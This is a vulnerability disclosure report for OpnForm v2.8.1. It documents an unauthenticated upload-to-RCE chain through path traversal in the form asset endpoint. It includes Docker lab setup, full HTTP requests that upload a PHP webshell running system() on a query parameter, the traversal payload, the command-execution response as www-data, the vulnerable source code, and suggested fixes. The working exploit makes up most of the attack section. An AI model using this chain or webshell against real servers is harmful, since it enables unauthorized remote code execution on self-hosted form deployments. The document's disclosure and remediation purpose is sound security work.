### Vulnerability details

**Official website / Product:** https://opnform.com / https://github.com/OpnForm/OpnForm

**Repository:** OpnForm/OpnForm (stars at selection: 3951)

**Vulnerability type:** file_upload → getshell (RCE)

**Vulnerable versions:** v2.8.1 (commit ef08a2f92b82bc5a19b310473cf0a26554ec8f7e); likely earlier builds that share `uploadAsset` + `S3KeyCleaner` allowing `/`

**Vulnerability URL / Parameter:** `POST /upload-file` then `POST /open/forms/assets/upload` body `url` (path traversal in destination filename); execute `GET /storage/<name>_<uuid>.php`

**Complex:** yes

### Verification procedure

1. Original `labs/opnform-r7a5/` was cleaned. Rebuild as follows (images `jhumanj/opnform-api:dev` + `jhumanj/opnform-client:dev` + `postgres:16` + `nginx:1`; API source pinned to v2.8.1; ingress **must** use official `docker/nginx.dev.conf` with `SCRIPT_FILENAME $document_root$fastcgi_script_name`, or `/storage/*.php` will not execute). Host port **18705** → ingress:80.

```bash
git clone https://github.com/OpnForm/OpnForm.git labs/opnform-r7a5
cd labs/opnform-r7a5
git checkout ef08a2f92b82bc5a19b310473cf0a26554ec8f7e   # tag v2.8.1
```

Use the compose below at the repo root (adapted from upstream `docker-compose.dev.yml`: drop fixed `container_name`, map port 18705, set `APP_URL`/`FRONT_URL`/`NUXT_PUBLIC_*` to `http://127.0.0.1:18705`; `./docker/nginx.dev.conf` comes from the same tag checkout):

```yaml
# docker-compose.yml (reconstructable lab; project name opnform-r7a5)
services:
  api:
    image: jhumanj/opnform-api:dev
    volumes:
      - ./api:/usr/share/nginx/html:delegated
      - /usr/share/nginx/html/vendor
      - ./api/storage:/usr/share/nginx/html/storage:delegated
    environment:
      APP_ENV: local
      APP_DEBUG: "true"
      APP_DEV_CORS: "true"
      APP_URL: http://127.0.0.1:18705
      FRONT_URL: http://127.0.0.1:18705
      APP_KEY: base64:dD8AFEB45nKZ0VWmIPiW495rDYb+ywRJnCCSdycw0pI=
      JWT_SECRET: 38hjE96gYu4ceKSSHNnzgeynMr2m3WkNBN2u7zzpVeiITtxFEloxAjcr7TCKuiiy
      JWT_SKIP_IP_UA_VALIDATION: "true"
      DB_HOST: db
      DB_DATABASE: forge
      DB_USERNAME: forge
      DB_PASSWORD: forge
      DB_CONNECTION: pgsql
      CACHE_DRIVER: file
      SESSION_DRIVER: file
      QUEUE_CONNECTION: sync
      FILESYSTEM_DRIVER: local
      LOCAL_FILESYSTEM_VISIBILITY: public
      MAIL_MAILER: log
      MAIL_FROM_ADDRESS: dev@localhost
      MAIL_FROM_NAME: OpnForm-Dev
      PHP_MEMORY_LIMIT: "1G"
      PHP_MAX_EXECUTION_TIME: "600"
      PHP_UPLOAD_MAX_FILESIZE: "64M"
      PHP_POST_MAX_SIZE: "64M"
    depends_on:
      db:
        condition: service_healthy

  ui:
    image: jhumanj/opnform-client:dev
    depends_on:
      api:
        condition: service_started
    command: sh -c "if [ ! -f node_modules/.install-complete ] || [ package.json -nt node_modules/.install-complete ]; then npm install && touch node_modules/.install-complete; fi && npm run docker-dev"
    volumes:
      - ./client:/app:delegated
      - client_node_modules:/app/node_modules
    environment:
      NODE_ENV: development
      NUXT_PUBLIC_APP_ENV: development
      NUXT_PUBLIC_APP_URL: "http://127.0.0.1:18705"
      NUXT_PUBLIC_API_BASE: "http://127.0.0.1:18705"
      NUXT_PRIVATE_API_BASE: "http://ingress"

  db:
    image: postgres:16
    environment:
      POSTGRES_DB: forge
      POSTGRES_USER: forge
      POSTGRES_PASSWORD: forge
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U \"$${POSTGRES_USER}\" -d \"$${POSTGRES_DB}\""]
      interval: 5s
      timeout: 5s
      retries: 5
    volumes:
      - postgres-data:/var/lib/postgresql/data

  ingress:
    image: nginx:1
    volumes:
      - ./docker/nginx.dev.conf:/etc/nginx/templates/default.conf.template
    environment:
      NGINX_HOST: localhost
      NGINX_PORT: 80
      NGINX_MAX_BODY_SIZE: 64m
    ports:
      - "18705:80"
    depends_on:
      api:
        condition: service_started
      ui:
        condition: service_started

volumes:
  postgres-data:
  client_node_modules:
```

PHP location from `docker/nginx.dev.conf` that enables the RCE (same-tag upstream text):

```nginx
location ~ \.php$ {
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    fastcgi_pass api:9000;
    fastcgi_index index.php;
    include fastcgi_params;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_param PATH_INFO $fastcgi_path_info;
    fastcgi_read_timeout 300;
}
```

```bash
docker compose -p opnform-r7a5 up -d
```

2. After up, if vendor lags the mounted `composer.lock`, run `composer install` inside the api container; migrate is already applied by the entrypoint. Confirm `FILESYSTEM_DRIVER=local` and `storage:link` present (`public/storage` → `storage/app/public`):

```bash
docker compose -p opnform-r7a5 exec api composer install
docker compose -p opnform-r7a5 exec api php artisan storage:link
```

`APP_URL`/`FRONT_URL`=`http://127.0.0.1:18705`. Expected containers roughly `opnform-r7a5-api` / `opnform-r7a5-ui` (or `…-client`) / `opnform-r7a5-db` / `opnform-r7a5-ingress`, port `0.0.0.0:18705->80/tcp`.

3. **No login required** (`uploadAsset` is explicitly opened via `withoutMiddleware(['auth.multi'])` and controller `except`). Upload a PHP webshell via unauthenticated `POST /upload-file`; note returned `uuid`.
4. Finalize with unauthenticated `POST /open/forms/assets/upload` and JSON `url` = `../../public/r7a5poc_<uuid>.php` (S3KeyCleaner preserves `/`).
5. Flysystem normalizes the destination to `storage/app/public/r7a5poc_<uuid>.php` (still inside the local disk root).
6. Request `GET /storage/r7a5poc_<uuid>.php?c=id` — PHP-FPM executes the file and returns `R7A5_SHELL_OK` plus `uid=82(www-data)`.

### Full vulnerability PoC

**Step 1 — unauthenticated temp upload**

Full HTTP request (Docker lab):

```http
POST /upload-file HTTP/1.1
Host: 127.0.0.1:18705
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryR7A5
Accept: application/json

------WebKitFormBoundaryR7A5
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php echo "R7A5_SHELL_OK\n"; system($_GET["c"] ?? "id"); ?>
------WebKitFormBoundaryR7A5--
```

Full HTTP response (201; record uuid):

```http
HTTP/1.1 201 Created
Content-Type: application/json

{"uuid":"799758fb-f4af-4714-ad45-6d83fee0b82b","key":"tmp/799758fb-f4af-4714-ad45-6d83fee0b82b"}
```

**Step 2 — path-traversal asset finalize (unauthenticated)**

Full HTTP request (Docker lab):

```http
POST /open/forms/assets/upload HTTP/1.1
Host: 127.0.0.1:18705
Content-Type: application/json
Accept: application/json
Content-Length: 72

{"url":"../../public/r7a5poc_799758fb-f4af-4714-ad45-6d83fee0b82b.php"}
```

Full HTTP response (raw Docker lab response):

```http
HTTP/1.1 200 OK
Server: nginx/1.31.8
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.3.26
Cache-Control: no-cache, private
Date: Sun, 01 Nov 2026 11:27:41 GMT
X-RateLimit-Limit: 30
X-RateLimit-Remaining: 29
Access-Control-Allow-Origin: http://127.0.0.1:18705
Vary: Origin

{"type":"success","message":"File uploaded.","url":"http://127.0.0.1:18705/forms/assets/../../public/r7a5poc_799758fb-f4af-4714-ad45-6d83fee0b82b.php"}
```

**Step 3 — RCE via storage symlink**

Full HTTP request (Docker lab):

```http
GET /storage/r7a5poc_799758fb-f4af-4714-ad45-6d83fee0b82b.php?c=id HTTP/1.1
Host: 127.0.0.1:18705
Accept: */*
```

Full HTTP response (raw Docker lab response):

```http
HTTP/1.1 200 OK
Server: nginx/1.31.8
Date: Sun, 01 Nov 2026 11:27:41 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.3.26

R7A5_SHELL_OK
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
```

Verification result notes:

- Step 1 returns uuid `799758fb-f4af-4714-ad45-6d83fee0b82b`, content stored at `tmp/<uuid>`.
- Step 2 successfully moves the file to traversal-normalized `storage/app/public/r7a5poc_<uuid>.php`.
- Step 3 executes PHP as www-data; response body (matches lab measurement) is:

```text
R7A5_SHELL_OK
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
```

### Vulnerability analysis

Unauthenticated form-asset upload is intentional for public forms, but destination naming is attacker-controlled:

1. `FileUploadController::upload` (`POST /upload-file`, `throttle:public-uploads`) stores the raw bytes under `tmp/<uuid>` with no executable-extension deny (`UploadSecurityService` only blocks HTML/XML later).
2. `FormController::uploadAsset` (controller `except` + route `withoutMiddleware(['auth.multi'])`) parses `url` with `StorageFileNameParser`, then moves to `assets/forms/` + `getMovedFileName()`.
3. `getMovedFileName()` keeps the client-supplied path prefix and extension, then runs `S3KeyCleaner::sanitize`, whose allowlist **includes `/`**.
4. Relative `../../public/...` segments are collapsed by Flysystem’s `WhitespacePathNormalizer` **without leaving** `storage/app` (`assets/forms/` + `../../public/x.php` → `public/x.php`), landing in `storage/app/public/`.
5. Laravel `storage:link` exposes that directory at `/storage/...`. Official `docker/nginx.dev.conf` sets `SCRIPT_FILENAME $document_root$fastcgi_script_name`, so `/storage/*.php` is executed → RCE as `www-data`.

`UploadSecurityService` only blocks `html|htm|xhtml|xml` (XSS fix for CVE-2025-11436); `.php` is allowed. `FileUploadPathService::validatePathComponent` rejects `/`, but `uploadAsset` never calls it.

Note: stock production `docker/nginx.conf` forces all `.php` to `index.php` (front controller), which mitigates direct execution on that specific ingress; the application still writes attacker PHP into the publicly linked storage tree. Dev compose / Apache / `php artisan serve` / many self-hosted nginx snippets execute it.

Vulnerable trigger / sink source (complete path and line numbers):

```php
# File: api/app/Http/Controllers/Forms/FormController.php
# Lines: 270-315
public function uploadAsset(UploadAssetRequest $request, UploadSecurityService $uploadSecurityService)
{
    $fileNameParser = StorageFileNameParser::parse($request->url);
    if (!$fileNameParser->uuid || !$fileNameParser->getMovedFileName()) {
        throw ValidationException::withMessages([
            'url' => ['Invalid file.'],
        ]);
    }

    $fileName = FileUploadPathService::getTmpFileUploadPath($fileNameParser->uuid);
    if (!Storage::exists($fileName)) {
        throw ValidationException::withMessages([
            'url' => ['File not found.'],
        ]);
    }
    // ... size check + UploadSecurityService::inspectStoredFile (blocks html/xml only) ...

    $newPath = self::ASSETS_UPLOAD_PATH . '/' . $fileNameParser->getMovedFileName();
    if ($inspection->isSvg) {
        if (!Storage::put($newPath, $inspection->sanitizedContents)) {
            throw new \RuntimeException('File storage failed.');
        }
        Storage::delete($fileName);
    } else {
        if (!Storage::move($fileName, $newPath)) {
            throw new \RuntimeException('File storage failed.');
        }
    }

    return $this->success([
        'message' => 'File uploaded.',
        'url' => route('forms.assets.show', [$fileNameParser->getMovedFileName()]),
    ]);
}
```

```php
# File: api/app/Service/Storage/StorageFileNameParser.php
# Lines: 30-39
public function getMovedFileName(): ?string
{
    if ($this->fileName && $this->extension) {
        $fileName = mb_substr($this->fileName, 0, 50) . '_' . $this->uuid . '.' . $this->extension;
        $fileName = preg_replace('#\p{C}+#u', '', $fileName);
        return $fileName ? S3KeyCleaner::sanitize($fileName) : null;
    }
    return $this->uuid;
}
```

```php
# File: api/app/Service/Storage/S3KeyCleaner.php
# Lines: 28-31
private function removeIllegalCharacters($value)
{
    $SAFE_CHARACTERS = '/[^0-9a-zA-Z! _\\.\\*\'\\(\\)\\-\\/]/'; // '/' allowed
    return preg_replace($SAFE_CHARACTERS, '', $value);
}
```

```php
# File: api/routes/api.php
# Lines: 289-293 (inside open/forms group)
Route::post(
    '/assets/upload',
    [FormController::class, 'uploadAsset']
)->middleware('throttle:public-uploads')->withoutMiddleware(['auth.multi'])->name('assets.upload');
```

```php
# File: api/app/Http/Controllers/Content/FileUploadController.php
# Lines: 20-51
public function upload(Request $request, UploadSecurityService $uploadSecurityService)
{
    $request->validate([
        'file' => 'required|file|max:' . (config('opnform.public_uploads.max_file_size') / 1024),
    ]);
    $inspection = $uploadSecurityService->inspectUploadedFile($request->file('file'));
    $uuid = (string) Str::uuid();
    $path = FileUploadPathService::getTmpFileUploadPath($uuid);
    // ... put raw bytes under tmp/<uuid> (php extension allowed) ...
    return response()->json([
        'uuid' => $uuid,
        'key' => $path,
    ], 201);
}
```

### Vulnerability Fix

- Reject path separators and `..` in `getMovedFileName()` / `uploadAsset` (reuse `FileUploadPathService::validatePathComponent` on the final basename only).
- Stop allowing `/` in `S3KeyCleaner` for local disk destinations (or use a basename-only cleaner for uploads).
- Deny dangerous extensions (`php`, `phtml`, `phar`, `htaccess`, etc.) in `UploadSecurityService` for both temp upload and asset finalize.
- Prefer storing under a non-webroot disk without `storage:link` exposure of user uploads, or serve only via `SafeFileResponseService` signed routes.
